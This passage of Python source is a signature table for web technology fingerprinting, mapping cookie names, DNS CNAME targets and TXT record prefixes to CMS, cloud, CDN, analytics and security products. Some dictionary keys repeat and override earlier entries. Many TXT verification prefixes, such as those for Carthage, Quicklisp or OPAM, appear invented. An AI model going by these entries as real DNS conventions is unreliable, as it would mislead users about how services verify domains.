                'CFID': {'name': 'ColdFusion', 'category': 'backend_technologies'},
                'wp-settings': {'name': 'WordPress', 'category': 'cms_platforms'},
                '_ga': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                '_gtm': {'name': 'Google Tag Manager', 'category': 'analytics_tools'},
                'fbp': {'name': 'Facebook Pixel', 'category': 'analytics_tools'},
                '_pk_id': {'name': 'Matomo', 'category': 'analytics_tools'},
                '_hjIncludedInSample': {'name': 'Hotjar', 'category': 'analytics_tools'},
                'ajs_user_id': {'name': 'Segment', 'category': 'analytics_tools'},
                'laravel_session': {'name': 'Laravel', 'category': 'backend_technologies'},
                'ci_session': {'name': 'CodeIgniter', 'category': 'backend_technologies'},
                'CAKEPHP': {'name': 'CakePHP', 'category': 'backend_technologies'},
                'connect.sid': {'name': 'Express.js', 'category': 'backend_technologies'},
                'csrftoken': {'name': 'Django', 'category': 'backend_technologies'},
                '_rails_session': {'name': 'Ruby on Rails', 'category': 'backend_technologies'},
                'sucuri_cloudproxy_uuid': {'name': 'Sucuri', 'category': 'security_technologies'},
                'wf_loginalerted': {'name': 'Wordfence', 'category': 'security_technologies'},
                'incap_ses': {'name': 'Imperva', 'category': 'security_technologies'}
            },

            'dns_records': {
                'CNAME': {
                    # Website Builders & CMS
                    'sites.squarespace.com': {'name': 'Squarespace', 'category': 'cms_platforms'},
                    'shops.myshopify.com': {'name': 'Shopify', 'category': 'cms_platforms'},
                    'proxy.webflow.com': {'name': 'Webflow', 'category': 'cms_platforms'},
                    'domains.tumblr.com': {'name': 'Tumblr', 'category': 'cms_platforms'},
                    'redirect.feedpress.me': {'name': 'FeedPress', 'category': 'cms_platforms'},
                    'domains.wordpress.com': {'name': 'WordPress.com', 'category': 'cms_platforms'},
                    'ghs.google.com': {'name': 'Google Sites', 'category': 'cms_platforms'},
                    'weebly.com': {'name': 'Weebly', 'category': 'cms_platforms'},
                    'wix.com': {'name': 'Wix', 'category': 'cms_platforms'},
                    'jimdo.com': {'name': 'Jimdo', 'category': 'cms_platforms'},
                    'strikingly.com': {'name': 'Strikingly', 'category': 'cms_platforms'},
                    'carrd.co': {'name': 'Carrd', 'category': 'cms_platforms'},
                    'tilda.ws': {'name': 'Tilda', 'category': 'cms_platforms'},
                    'readymag.com': {'name': 'Readymag', 'category': 'cms_platforms'},
                    'format.com': {'name': 'Format', 'category': 'cms_platforms'},
                    'carbonmade.com': {'name': 'Carbonmade', 'category': 'cms_platforms'},
                    'behance.net': {'name': 'Behance', 'category': 'cms_platforms'},
                    'dribbble.com': {'name': 'Dribbble', 'category': 'cms_platforms'},
                    'myportfolio.com': {'name': 'Adobe Portfolio', 'category': 'cms_platforms'},
                    'zyrosite.com': {'name': 'Zyro', 'category': 'cms_platforms'},
                    'hostinger.com': {'name': 'Hostinger Website Builder', 'category': 'cms_platforms'},
                    'godaddysites.com': {'name': 'GoDaddy Website Builder', 'category': 'cms_platforms'},
                    'ionos-server.com': {'name': 'IONOS Website Builder', 'category': 'cms_platforms'},
                    'websitebuilder.com': {'name': 'Website Builder', 'category': 'cms_platforms'},
                    'site123.com': {'name': 'SITE123', 'category': 'cms_platforms'},
                    'yola.net': {'name': 'Yola', 'category': 'cms_platforms'},
                    'sites.zoho.com': {'name': 'Zoho Sites', 'category': 'cms_platforms'},
                    'duda.co': {'name': 'Duda', 'category': 'cms_platforms'},
                    'ucraft.com': {'name': 'uCraft', 'category': 'cms_platforms'},
                    'ukit.com': {'name': 'uKit', 'category': 'cms_platforms'},
                    'mozello.com': {'name': 'Mozello', 'category': 'cms_platforms'},
                    'webnode.com': {'name': 'Webnode', 'category': 'cms_platforms'},
                    'webstarts.com': {'name': 'WebStarts', 'category': 'cms_platforms'},
                    'imcreator.com': {'name': 'IM Creator', 'category': 'cms_platforms'},
                    'sitebuilder.com': {'name': 'SiteBuilder', 'category': 'cms_platforms'},
                    'about.me': {'name': 'About.me', 'category': 'cms_platforms'},
                    'linktr.ee': {'name': 'Linktree', 'category': 'cms_platforms'},
                    'bio.link': {'name': 'Bio.link', 'category': 'cms_platforms'},
                    'beacons.ai': {'name': 'Beacons', 'category': 'cms_platforms'},
                    'koji.to': {'name': 'Koji', 'category': 'cms_platforms'},
                    
                    # Cloud Platforms
                    'ghs.googlehosted.com': {'name': 'Google Cloud', 'category': 'cloud_services'},
                    'azurewebsites.net': {'name': 'Microsoft Azure', 'category': 'cloud_services'},
                    'herokuapp.com': {'name': 'Heroku', 'category': 'cloud_services'},
                    'vercel.app': {'name': 'Vercel', 'category': 'cloud_services'},
                    'vercel.com': {'name': 'Vercel', 'category': 'cloud_services'},
                    'netlify.app': {'name': 'Netlify', 'category': 'cloud_services'},
                    'netlify.com': {'name': 'Netlify', 'category': 'cloud_services'},
                    'surge.sh': {'name': 'Surge.sh', 'category': 'cloud_services'},
                    'github.io': {'name': 'GitHub Pages', 'category': 'cloud_services'},
                    'gitlab.io': {'name': 'GitLab Pages', 'category': 'cloud_services'},
                    'bitbucket.io': {'name': 'Bitbucket', 'category': 'cloud_services'},
                    'render.com': {'name': 'Render', 'category': 'cloud_services'},
                    'railway.app': {'name': 'Railway', 'category': 'cloud_services'},
                    'fly.dev': {'name': 'Fly.io', 'category': 'cloud_services'},
                    'digitaloceanspaces.com': {'name': 'DigitalOcean Spaces', 'category': 'cloud_services'},
                    'do.co': {'name': 'DigitalOcean', 'category': 'cloud_services'},
                    'linode.com': {'name': 'Linode', 'category': 'cloud_services'},
                    'vultr.com': {'name': 'Vultr', 'category': 'cloud_services'},
                    'hetzner.cloud': {'name': 'Hetzner Cloud', 'category': 'cloud_services'},
                    'ovh.net': {'name': 'OVH', 'category': 'cloud_services'},
                    'scaleway.com': {'name': 'Scaleway', 'category': 'cloud_services'},
                    'upcloud.com': {'name': 'UpCloud', 'category': 'cloud_services'},
                    'dreamhost.com': {'name': 'DreamHost', 'category': 'cloud_services'},
                    'bluehost.com': {'name': 'Bluehost', 'category': 'cloud_services'},
                    'siteground.com': {'name': 'SiteGround', 'category': 'cloud_services'},
                    'hostgator.com': {'name': 'HostGator', 'category': 'cloud_services'},
                    'godaddy.com': {'name': 'GoDaddy', 'category': 'cloud_services'},
                    'namecheap.com': {'name': 'Namecheap', 'category': 'cloud_services'},
                    'ionos.com': {'name': 'IONOS', 'category': 'cloud_services'},
                    'a2hosting.com': {'name': 'A2 Hosting', 'category': 'cloud_services'},
                    'inmotion.com': {'name': 'InMotion Hosting', 'category': 'cloud_services'},
                    'wpengine.com': {'name': 'WP Engine', 'category': 'cloud_services'},
                    'kinsta.com': {'name': 'Kinsta', 'category': 'cloud_services'},
                    'pantheon.io': {'name': 'Pantheon', 'category': 'cloud_services'},
                    'acquia.com': {'name': 'Acquia', 'category': 'cloud_services'},
                    'platform.sh': {'name': 'Platform.sh', 'category': 'cloud_services'},
                    'rackspace.com': {'name': 'Rackspace', 'category': 'cloud_services'},
                    'cloudways.com': {'name': 'Cloudways', 'category': 'cloud_services'},
                    'gridpane.com': {'name': 'GridPane', 'category': 'cloud_services'},
                    'runcloud.io': {'name': 'RunCloud', 'category': 'cloud_services'},
                    'spinupwp.com': {'name': 'SpinupWP', 'category': 'cloud_services'},
                    'serverpilot.io': {'name': 'ServerPilot', 'category': 'cloud_services'},
                    'forge.laravel.com': {'name': 'Laravel Forge', 'category': 'cloud_services'},
                    'envoyer.io': {'name': 'Laravel Envoyer', 'category': 'cloud_services'},
                    'vapor.laravel.com': {'name': 'Laravel Vapor', 'category': 'cloud_services'},
                    'zeit.co': {'name': 'Zeit (Vercel)', 'category': 'cloud_services'},
                    'now.sh': {'name': 'Zeit Now (Vercel)', 'category': 'cloud_services'},
                    'firebase.app': {'name': 'Firebase Hosting', 'category': 'cloud_services'},
                    'firebaseapp.com': {'name': 'Firebase Hosting', 'category': 'cloud_services'},
                    'aws.amazon.com': {'name': 'Amazon AWS', 'category': 'cloud_services'},
                    'amazonaws.com': {'name': 'Amazon AWS', 'category': 'cloud_services'},
                    'awsglobalconfig.com': {'name': 'Amazon AWS', 'category': 'cloud_services'},
                    's3.amazonaws.com': {'name': 'Amazon S3', 'category': 'cloud_services'},
                    's3-website': {'name': 'Amazon S3 Website', 'category': 'cloud_services'},
                    'cloudfront.net': {'name': 'Amazon CloudFront', 'category': 'cdn_services'},
                    'elb.amazonaws.com': {'name': 'Amazon ELB', 'category': 'cloud_services'},
                    'elasticbeanstalk.com': {'name': 'Amazon Elastic Beanstalk', 'category': 'cloud_services'},
                    'compute.amazonaws.com': {'name': 'Amazon EC2', 'category': 'cloud_services'},
                    'rds.amazonaws.com': {'name': 'Amazon RDS', 'category': 'databases'},
                    'lightsail.aws.amazon.com': {'name': 'Amazon Lightsail', 'category': 'cloud_services'},
                    'appspot.com': {'name': 'Google App Engine', 'category': 'cloud_services'},
                    'googleusercontent.com': {'name': 'Google Cloud Storage', 'category': 'cloud_services'},
                    'storage.googleapis.com': {'name': 'Google Cloud Storage', 'category': 'cloud_services'},
                    'compute.googleapis.com': {'name': 'Google Compute Engine', 'category': 'cloud_services'},
                    'run.app': {'name': 'Google Cloud Run', 'category': 'cloud_services'},
                    'cloudfunctions.net': {'name': 'Google Cloud Functions', 'category': 'cloud_services'},
                    'firestore.googleapis.com': {'name': 'Google Firestore', 'category': 'databases'},
                    'cloudflaressl.com': {'name': 'Cloudflare SSL', 'category': 'security_technologies'},
                    'cloudflare.net': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    'cloudflare.com': {'name': 'Cloudflare', 'category': 'cdn_services'},
                    'azure-api.net': {'name': 'Microsoft Azure API', 'category': 'cloud_services'},
                    'azureedge.net': {'name': 'Microsoft Azure CDN', 'category': 'cdn_services'},
                    'azurefd.net': {'name': 'Microsoft Azure Front Door', 'category': 'cdn_services'},
                    'database.windows.net': {'name': 'Microsoft SQL Azure', 'category': 'databases'},
                    'servicebus.windows.net': {'name': 'Microsoft Azure Service Bus', 'category': 'cloud_services'},
                    'blob.core.windows.net': {'name': 'Microsoft Azure Blob Storage', 'category': 'cloud_services'},
                    'table.core.windows.net': {'name': 'Microsoft Azure Table Storage', 'category': 'databases'},
                    'queue.core.windows.net': {'name': 'Microsoft Azure Queue Storage', 'category': 'cloud_services'},
                    'file.core.windows.net': {'name': 'Microsoft Azure File Storage', 'category': 'cloud_services'},
                    'documents.azure.com': {'name': 'Microsoft Azure Cosmos DB', 'category': 'databases'},
                    'vault.azure.net': {'name': 'Microsoft Azure Key Vault', 'category': 'security_technologies'},
                    'search.windows.net': {'name': 'Microsoft Azure Search', 'category': 'cloud_services'},
                    'redis.cache.windows.net': {'name': 'Microsoft Azure Redis Cache', 'category': 'databases'},
                    'servicebus.cloudapi.de': {'name': 'Microsoft Azure Germany', 'category': 'cloud_services'},
                    
                    # CDN Services
                    'cloudfront.net': {'name': 'Amazon CloudFront', 'category': 'cdn_services'},
                    'azureedge.net': {'name': 'Microsoft Azure CDN', 'category': 'cdn_services'},
                    'googleusercontent.com': {'name': 'Google Cloud CDN', 'category': 'cdn_services'},
                    'fastly.com': {'name': 'Fastly', 'category': 'cdn_services'},
                    'fastlylb.net': {'name': 'Fastly', 'category': 'cdn_services'},
                    'edgecastcdn.net': {'name': 'EdgeCast', 'category': 'cdn_services'},
                    'akamai.net': {'name': 'Akamai', 'category': 'cdn_services'},
                    'akamaihd.net': {'name': 'Akamai', 'category': 'cdn_services'},
                    'akamaitechnologies.com': {'name': 'Akamai', 'category': 'cdn_services'},
                    'edgesuite.net': {'name': 'Akamai EdgeSuite', 'category': 'cdn_services'},
                    'edgekey.net': {'name': 'Akamai EdgeKey', 'category': 'cdn_services'},
                    'akamaized.net': {'name': 'Akamai', 'category': 'cdn_services'},
                    'akamaistream.net': {'name': 'Akamai Stream', 'category': 'cdn_services'},
                    'limelight.com': {'name': 'Limelight Networks', 'category': 'cdn_services'},
                    'llnwd.net': {'name': 'Limelight Networks', 'category': 'cdn_services'},
                    'maxcdn.com': {'name': 'MaxCDN', 'category': 'cdn_services'},
                    'stackpathdns.com': {'name': 'StackPath', 'category': 'cdn_services'},
                    'stackpathcdn.com': {'name': 'StackPath CDN', 'category': 'cdn_services'},
                    'jsdelivr.net': {'name': 'jsDelivr', 'category': 'cdn_services'},
                    'unpkg.com': {'name': 'unpkg', 'category': 'cdn_services'},
                    'cdnjs.cloudflare.com': {'name': 'cdnjs', 'category': 'cdn_services'},
                    'googlecdn.com': {'name': 'Google CDN', 'category': 'cdn_services'},
                    'gstatic.com': {'name': 'Google Static Content', 'category': 'cdn_services'},
                    'microsoftajax.com': {'name': 'Microsoft Ajax CDN', 'category': 'cdn_services'},
                    'aspnetcdn.com': {'name': 'Microsoft ASP.NET CDN', 'category': 'cdn_services'},
                    'bootstrapcdn.com': {'name': 'Bootstrap CDN', 'category': 'cdn_services'},
                    'jquery.com': {'name': 'jQuery CDN', 'category': 'cdn_services'},
                    'cdnjs.com': {'name': 'cdnjs', 'category': 'cdn_services'},
                    'rawgit.com': {'name': 'RawGit', 'category': 'cdn_services'},
                    'gitcdn.xyz': {'name': 'GitCDN', 'category': 'cdn_services'},
                    'combinatronics.com': {'name': 'Combinatronics CDN', 'category': 'cdn_services'},
                    'keycdn.com': {'name': 'KeyCDN', 'category': 'cdn_services'},
                    'bunnycdn.com': {'name': 'BunnyCDN', 'category': 'cdn_services'},
                    'kxcdn.com': {'name': 'KeyCDN', 'category': 'cdn_services'},
                    'hwcdn.net': {'name': 'Highwinds CDN', 'category': 'cdn_services'},
                    'cachefly.net': {'name': 'CacheFly', 'category': 'cdn_services'},
                    'belugacdn.com': {'name': 'BelugaCDN', 'category': 'cdn_services'},
                    'rackspacecloud.com': {'name': 'Rackspace Cloud Files CDN', 'category': 'cdn_services'},
                    'rackcdn.com': {'name': 'Rackspace CDN', 'category': 'cdn_services'},
                    'panthercdn.com': {'name': 'PantherCDN', 'category': 'cdn_services'},
                    'swiftcdn.com': {'name': 'SwiftCDN', 'category': 'cdn_services'},
                    'cedexis.net': {'name': 'Cedexis', 'category': 'cdn_services'},
                    'section.io': {'name': 'Section.io', 'category': 'cdn_services'},
                    'imperva.com': {'name': 'Imperva CDN', 'category': 'cdn_services'},
                    'sucuri.net': {'name': 'Sucuri CDN', 'category': 'cdn_services'},
                    'photon.io': {'name': 'Photon CDN', 'category': 'cdn_services'},
                    'wp.com': {'name': 'WordPress.com CDN', 'category': 'cdn_services'},
                    'jetpack.com': {'name': 'Jetpack CDN', 'category': 'cdn_services'},
                    'gravatar.com': {'name': 'Gravatar CDN', 'category': 'cdn_services'},
                    
                    # Email Services
                    'mailgun.org': {'name': 'Mailgun', 'category': 'cloud_services'},
                    'sendgrid.net': {'name': 'SendGrid', 'category': 'cloud_services'},
                    'postmarkapp.com': {'name': 'Postmark', 'category': 'cloud_services'},
                    'amazonses.com': {'name': 'Amazon SES', 'category': 'cloud_services'},
                    'sparkpostmail.com': {'name': 'SparkPost', 'category': 'cloud_services'},
                    'mailjet.com': {'name': 'Mailjet', 'category': 'cloud_services'},
                    'sendinblue.com': {'name': 'Sendinblue', 'category': 'cloud_services'},
                    'elasticemail.com': {'name': 'Elastic Email', 'category': 'cloud_services'},
                    'pepipost.com': {'name': 'Pepipost', 'category': 'cloud_services'},
                    'socketlabs.com': {'name': 'SocketLabs', 'category': 'cloud_services'},
                    'smtp2go.com': {'name': 'SMTP2GO', 'category': 'cloud_services'},
                    'mailersend.io': {'name': 'MailerSend', 'category': 'cloud_services'},
                    'resend.com': {'name': 'Resend', 'category': 'cloud_services'},
                    'loops.so': {'name': 'Loops', 'category': 'cloud_services'},
                    'convertkit.com': {'name': 'ConvertKit', 'category': 'cloud_services'},
                    'activecampaign.com': {'name': 'ActiveCampaign', 'category': 'cloud_services'},
                    'getdrip.com': {'name': 'Drip', 'category': 'cloud_services'},
                    'infusionsoft.com': {'name': 'Infusionsoft', 'category': 'cloud_services'},
                    'keap.com': {'name': 'Keap', 'category': 'cloud_services'},
                    'ontraport.com': {'name': 'Ontraport', 'category': 'cloud_services'},
                    'pardot.com': {'name': 'Pardot', 'category': 'cloud_services'},
                    'marketo.com': {'name': 'Marketo', 'category': 'cloud_services'},
                    'hubspot.com': {'name': 'HubSpot', 'category': 'cloud_services'},
                    'mailchimp.com': {'name': 'Mailchimp', 'category': 'cloud_services'},
                    'constantcontact.com': {'name': 'Constant Contact', 'category': 'cloud_services'},
                    'aweber.com': {'name': 'AWeber', 'category': 'cloud_services'},
                    'campaignmonitor.com': {'name': 'Campaign Monitor', 'category': 'cloud_services'},
                    'getresponse.com': {'name': 'GetResponse', 'category': 'cloud_services'},
                    'benchmarkemail.com': {'name': 'Benchmark Email', 'category': 'cloud_services'},
                    'myemma.com': {'name': 'Emma', 'category': 'cloud_services'},
                    'icontact.com': {'name': 'iContact', 'category': 'cloud_services'},
                    'verticalresponse.com': {'name': 'Vertical Response', 'category': 'cloud_services'},
                    'madmimi.com': {'name': 'Mad Mimi', 'category': 'cloud_services'},
                    'pinpointe.com': {'name': 'Pinpointe', 'category': 'cloud_services'},
                    
                    # Database Services
                    'mongodb.net': {'name': 'MongoDB Atlas', 'category': 'databases'},
                    'cosmos.azure.com': {'name': 'Azure Cosmos DB', 'category': 'databases'},
                    'dynamodb.amazonaws.com': {'name': 'Amazon DynamoDB', 'category': 'databases'},
                    'firestore.googleapis.com': {'name': 'Google Firestore', 'category': 'databases'},
                    'supabase.co': {'name': 'Supabase', 'category': 'databases'},
                    'planetscale.com': {'name': 'PlanetScale', 'category': 'databases'},
                    'railway.app': {'name': 'Railway DB', 'category': 'databases'},
                    'neon.tech': {'name': 'Neon', 'category': 'databases'},
                    'cockroachlabs.cloud': {'name': 'CockroachDB', 'category': 'databases'},
                    'fauna.com': {'name': 'FaunaDB', 'category': 'databases'},
                    'airtable.com': {'name': 'Airtable', 'category': 'databases'},
                    'notion.so': {'name': 'Notion', 'category': 'databases'},
                    'hasura.app': {'name': 'Hasura', 'category': 'databases'},
                    'graphcms.com': {'name': 'GraphCMS', 'category': 'databases'},
                    'sanity.studio': {'name': 'Sanity', 'category': 'databases'},
                    'contentful.com': {'name': 'Contentful', 'category': 'databases'},
                    'strapi.io': {'name': 'Strapi', 'category': 'databases'},
                    'redis.com': {'name': 'Redis Cloud', 'category': 'databases'},
                    'redislabs.com': {'name': 'Redis Labs', 'category': 'databases'},
                    'memcachier.com': {'name': 'MemCachier', 'category': 'databases'},
                    'elephantsql.com': {'name': 'ElephantSQL', 'category': 'databases'},
                    'cleardb.com': {'name': 'ClearDB', 'category': 'databases'},
                    'jawsdb.com': {'name': 'JawsDB', 'category': 'databases'},
                    'remotemysql.com': {'name': 'RemoteMySQL', 'category': 'databases'},
                    'freemysqlhosting.net': {'name': 'Free MySQL Hosting', 'category': 'databases'},
                    'db4free.net': {'name': 'db4free', 'category': 'databases'},
                    
                    # Analytics & Tracking
                    'google-analytics.com': {'name': 'Google Analytics', 'category': 'analytics_tools'},
                    'googletagmanager.com': {'name': 'Google Tag Manager', 'category': 'analytics_tools'},
                    'doubleclick.net': {'name': 'Google DoubleClick', 'category': 'analytics_tools'},
                    'googlesyndication.com': {'name': 'Google AdSense', 'category': 'analytics_tools'},
                    'googleadservices.com': {'name': 'Google Ads', 'category': 'analytics_tools'},
                    'facebook.com': {'name': 'Facebook Pixel', 'category': 'analytics_tools'},
                    'connect.facebook.net': {'name': 'Facebook SDK', 'category': 'analytics_tools'},
                    'hotjar.com': {'name': 'Hotjar', 'category': 'analytics_tools'},
                    'segment.com': {'name': 'Segment', 'category': 'analytics_tools'},
                    'segment.io': {'name': 'Segment', 'category': 'analytics_tools'},
                    'amplitude.com': {'name': 'Amplitude', 'category': 'analytics_tools'},
                    'mixpanel.com': {'name': 'Mixpanel', 'category': 'analytics_tools'},
                    'fullstory.com': {'name': 'FullStory', 'category': 'analytics_tools'},
                    'logrocket.com': {'name': 'LogRocket', 'category': 'analytics_tools'},
                    'smartlook.com': {'name': 'Smartlook', 'category': 'analytics_tools'},
                    'mouseflow.com': {'name': 'Mouseflow', 'category': 'analytics_tools'},
                    'crazyegg.com': {'name': 'Crazy Egg', 'category': 'analytics_tools'},
                    'luckyorange.com': {'name': 'Lucky Orange', 'category': 'analytics_tools'},
                    'inspectlet.com': {'name': 'Inspectlet', 'category': 'analytics_tools'},
                    'clicktale.net': {'name': 'ClickTale', 'category': 'analytics_tools'},
                    'sessioncam.com': {'name': 'SessionCam', 'category': 'analytics_tools'},
                    'quantummetric.com': {'name': 'Quantum Metric', 'category': 'analytics_tools'},
                    'contentsquare.net': {'name': 'ContentSquare', 'category': 'analytics_tools'},
                    'glassbox.com': {'name': 'Glassbox', 'category': 'analytics_tools'},
                    'dynatrace.com': {'name': 'Dynatrace', 'category': 'analytics_tools'},
                    'newrelic.com': {'name': 'New Relic', 'category': 'analytics_tools'},
                    'datadog.com': {'name': 'Datadog', 'category': 'analytics_tools'},
                    'sentry.io': {'name': 'Sentry', 'category': 'analytics_tools'},
                    'bugsnag.com': {'name': 'Bugsnag', 'category': 'analytics_tools'},
                    'rollbar.com': {'name': 'Rollbar', 'category': 'analytics_tools'},
                    'honeybadger.io': {'name': 'Honeybadger', 'category': 'analytics_tools'},
                    'raygun.com': {'name': 'Raygun', 'category': 'analytics_tools'},
                    'airbrake.io': {'name': 'Airbrake', 'category': 'analytics_tools'},
                    'errorception.com': {'name': 'Errorception', 'category': 'analytics_tools'},
                    'muscula.com': {'name': 'Muscula', 'category': 'analytics_tools'},
                    'trackjs.com': {'name': 'TrackJS', 'category': 'analytics_tools'},
                    'exceptionsjs.com': {'name': 'ExceptionsJS', 'category': 'analytics_tools'},
                    'errorify.io': {'name': 'Errorify', 'category': 'analytics_tools'},
                    'flawcheck.com': {'name': 'FlawCheck', 'category': 'analytics_tools'},
                    'errorbucket.com': {'name': 'ErrorBucket', 'category': 'analytics_tools'},
                    'exceptionless.com': {'name': 'Exceptionless', 'category': 'analytics_tools'},
                    'elmah.io': {'name': 'elmah.io', 'category': 'analytics_tools'},
                    'retrace.stackify.com': {'name': 'Stackify Retrace', 'category': 'analytics_tools'},
                    'stackify.com': {'name': 'Stackify', 'category': 'analytics_tools'},
                    'appsignal.com': {'name': 'AppSignal', 'category': 'analytics_tools'},
                    'scout-apm.com': {'name': 'Scout APM', 'category': 'analytics_tools'},
                    'skylight.io': {'name': 'Skylight', 'category': 'analytics_tools'},
                    'pingdom.com': {'name': 'Pingdom', 'category': 'analytics_tools'},
                    'uptime.com': {'name': 'Uptime.com', 'category': 'analytics_tools'},
                    'uptimerobot.com': {'name': 'UptimeRobot', 'category': 'analytics_tools'},
                    'statuspage.io': {'name': 'StatusPage', 'category': 'analytics_tools'},
                    'cachet.io': {'name': 'Cachet', 'category': 'analytics_tools'},
                    'freshping.io': {'name': 'Freshping', 'category': 'analytics_tools'},
                    'pingbreak.com': {'name': 'Pingbreak', 'category': 'analytics_tools'},
                    'monitor.us': {'name': 'Monitor.us', 'category': 'analytics_tools'},
                    'site24x7.com': {'name': 'Site24x7', 'category': 'analytics_tools'},
                    'monitis.com': {'name': 'Monitis', 'category': 'analytics_tools'},
                    'nodeping.com': {'name': 'NodePing', 'category': 'analytics_tools'},
                    'montastic.com': {'name': 'Montastic', 'category': 'analytics_tools'},
                    'checkly.com': {'name': 'Checkly', 'category': 'analytics_tools'},
                    'ghostinspector.com': {'name': 'Ghost Inspector', 'category': 'analytics_tools'},
                    'browserstack.com': {'name': 'BrowserStack', 'category': 'development_tools'},
                    'saucelabs.com': {'name': 'Sauce Labs', 'category': 'development_tools'},
                    'crossbrowsertesting.com': {'name': 'CrossBrowserTesting', 'category': 'development_tools'},
                    'lambdatest.com': {'name': 'LambdaTest', 'category': 'development_tools'},
                    'testingbot.com': {'name': 'TestingBot', 'category': 'development_tools'},
                    'selenium.dev': {'name': 'Selenium Grid', 'category': 'development_tools'},
                    'webdriver.io': {'name': 'WebDriver.io', 'category': 'development_tools'},
                    'cypress.io': {'name': 'Cypress', 'category': 'development_tools'},
                    'playwright.dev': {'name': 'Playwright', 'category': 'development_tools'},
                    'puppeteer.dev': {'name': 'Puppeteer', 'category': 'development_tools'}
                },
                
                'TXT': {
                    # Domain Verification
                    'google-site-verification': {'name': 'Google Search Console', 'category': 'development_tools'},
                    'facebook-domain-verification': {'name': 'Facebook', 'category': 'analytics_tools'},
                    'yandex-verification': {'name': 'Yandex Webmaster', 'category': 'development_tools'},
                    'bing-site-verification': {'name': 'Bing Webmaster Tools', 'category': 'development_tools'},
                    'apple-domain-verification': {'name': 'Apple Developer', 'category': 'development_tools'},
                    'zoom-domain-verification': {'name': 'Zoom', 'category': 'development_tools'},
                    'stripe-verification': {'name': 'Stripe', 'category': 'development_tools'},
                    'paypal-domain-verification': {'name': 'PayPal', 'category': 'development_tools'},
                    'shopify-domain-verification': {'name': 'Shopify', 'category': 'cms_platforms'},
                    'squarespace-domain-verification': {'name': 'Squarespace', 'category': 'cms_platforms'},
                    'wix-verification': {'name': 'Wix', 'category': 'cms_platforms'},
                    'weebly-verification': {'name': 'Weebly', 'category': 'cms_platforms'},
                    'webflow-verification': {'name': 'Webflow', 'category': 'cms_platforms'},
                    'adobe-domain-verification': {'name': 'Adobe', 'category': 'development_tools'},
                    'atlassian-domain-verification': {'name': 'Atlassian', 'category': 'development_tools'},
                    'slack-verification': {'name': 'Slack', 'category': 'development_tools'},
                    'discord-verification': {'name': 'Discord', 'category': 'development_tools'},
                    'telegram-verification': {'name': 'Telegram', 'category': 'development_tools'},
                    'whatsapp-verification': {'name': 'WhatsApp Business', 'category': 'development_tools'},
                    'twitter-verification': {'name': 'Twitter', 'category': 'analytics_tools'},
                    'linkedin-verification': {'name': 'LinkedIn', 'category': 'analytics_tools'},
                    'pinterest-verification': {'name': 'Pinterest', 'category': 'analytics_tools'},
                    'tiktok-verification': {'name': 'TikTok', 'category': 'analytics_tools'},
                    'youtube-verification': {'name': 'YouTube', 'category': 'analytics_tools'},
                    'instagram-verification': {'name': 'Instagram', 'category': 'analytics_tools'},
                    'snapchat-verification': {'name': 'Snapchat', 'category': 'analytics_tools'},
                    'reddit-verification': {'name': 'Reddit', 'category': 'analytics_tools'},
                    'medium-verification': {'name': 'Medium', 'category': 'analytics_tools'},
                    'tumblr-verification': {'name': 'Tumblr', 'category': 'analytics_tools'},
                    'behance-verification': {'name': 'Behance', 'category': 'analytics_tools'},
                    'dribbble-verification': {'name': 'Dribbble', 'category': 'analytics_tools'},
                    'github-verification': {'name': 'GitHub', 'category': 'development_tools'},
                    'gitlab-verification': {'name': 'GitLab', 'category': 'development_tools'},
                    'bitbucket-verification': {'name': 'Bitbucket', 'category': 'development_tools'},
                    'codepen-verification': {'name': 'CodePen', 'category': 'development_tools'},
                    'jsfiddle-verification': {'name': 'JSFiddle', 'category': 'development_tools'},
                    'replit-verification': {'name': 'Replit', 'category': 'development_tools'},
                    'glitch-verification': {'name': 'Glitch', 'category': 'development_tools'},
                    'stackblitz-verification': {'name': 'StackBlitz', 'category': 'development_tools'},
                    'codesandbox-verification': {'name': 'CodeSandbox', 'category': 'development_tools'},
                    'observablehq-verification': {'name': 'Observable', 'category': 'development_tools'},
                    'kaggle-verification': {'name': 'Kaggle', 'category': 'development_tools'},
                    'huggingface-verification': {'name': 'Hugging Face', 'category': 'development_tools'},
                    'dockerhub-verification': {'name': 'Docker Hub', 'category': 'development_tools'},
                    'npm-verification': {'name': 'npm', 'category': 'development_tools'},
                    'pypi-verification': {'name': 'PyPI', 'category': 'development_tools'},
                    'rubygems-verification': {'name': 'RubyGems', 'category': 'development_tools'},
                    'packagist-verification': {'name': 'Packagist', 'category': 'development_tools'},
                    'nuget-verification': {'name': 'NuGet', 'category': 'development_tools'},
                    'mvnrepository-verification': {'name': 'Maven Repository', 'category': 'development_tools'},
                    'gradle-verification': {'name': 'Gradle', 'category': 'development_tools'},
                    'cocoapods-verification': {'name': 'CocoaPods', 'category': 'development_tools'},
                    'carthage-verification': {'name': 'Carthage', 'category': 'development_tools'},
                    'swiftpackagemanager-verification': {'name': 'Swift Package Manager', 'category': 'development_tools'},
                    'pub-verification': {'name': 'Dart Pub', 'category': 'development_tools'},
                    'crates-verification': {'name': 'Crates.io', 'category': 'development_tools'},
                    'hackage-verification': {'name': 'Hackage', 'category': 'development_tools'},
                    'hex-verification': {'name': 'Hex.pm', 'category': 'development_tools'},
                    'opam-verification': {'name': 'OPAM', 'category': 'development_tools'},
                    'quicklisp-verification': {'name': 'Quicklisp', 'category': 'development_tools'},
                    'cpan-verification': {'name': 'CPAN', 'category': 'development_tools'},
                    'go-verification': {'name': 'Go Modules', 'category': 'development_tools'},
                    'julia-verification': {'name': 'Julia Packages', 'category': 'development_tools'},
                    'r-verification': {'name': 'CRAN', 'category': 'development_tools'},
                    'conda-verification': {'name': 'Conda', 'category': 'development_tools'},
                    'bioconda-verification': {'name': 'Bioconda', 'category': 'development_tools'},
                    
                    # Email Authentication - SPF Records
                    'v=spf1 include:spf.protection.outlook.com': {'name': 'Microsoft Office 365', 'category': 'cloud_services'},
                    'v=spf1 include:_spf.google.com': {'name': 'Google Workspace', 'category': 'cloud_services'},
                    'v=spf1 include:mailgun.org': {'name': 'Mailgun', 'category': 'cloud_services'},
                    'v=spf1 include:sendgrid.net': {'name': 'SendGrid', 'category': 'cloud_services'},
                    'v=spf1 include:servers.mcsv.net': {'name': 'Mailchimp', 'category': 'cloud_services'},
                    'v=spf1 include:amazonses.com': {'name': 'Amazon SES', 'category': 'cloud_services'},
                    'v=spf1 include:sparkpostmail.com': {'name': 'SparkPost', 'category': 'cloud_services'},
                    'v=spf1 include:mailjet.com': {'name': 'Mailjet', 'category': 'cloud_services'},
